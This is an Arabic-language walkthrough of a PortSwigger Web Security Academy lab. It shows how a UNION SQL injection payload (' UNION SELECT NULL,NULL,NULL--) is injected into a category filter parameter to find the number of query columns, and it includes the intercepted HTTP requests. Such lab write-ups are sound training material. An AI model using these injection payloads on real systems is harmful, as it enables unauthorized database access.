# [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

## **`الهدف`**
قم بتنفيذ هجوم `UNION SQLi` لتحديد عدد الأعمدة التي تُسترجع في الاستعلام.
## **`خطوات الحل`**
نقوم بالدخول إلى اللاب ثم نضغط على أى `category` مثل `Pet` وإعتراض الطلب وتحويله إلى `Repeater`.
```http
GET /filter?category=Pets HTTP/2
Host: 0a1600de0473d66d80a949da006d00af.web-security-academy.net
Cookie: session=RuvKYhRePwqrgg5XaWpgkIzNppyRUy6i
```

ثم نغير الـ `Parameter` الخاص بالـ `Category` الموجود داخل `Inspector` إلى

```sql
' UNION SELECT NULL,NULL,NULL--
```

```http
GET /filter?category=Pets%20'%20UNION%20SELECT%20NULL%2cNULL%2cNULL-- HTTP/2
Host: 0a1600de0473d66d80a949da006d00af.web-security-academy.net
Cookie: session=RuvKYhRePwqrgg5XaWpgkIzNppyRUy6i
```
ثم نقوم بإرسال الطلب لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)
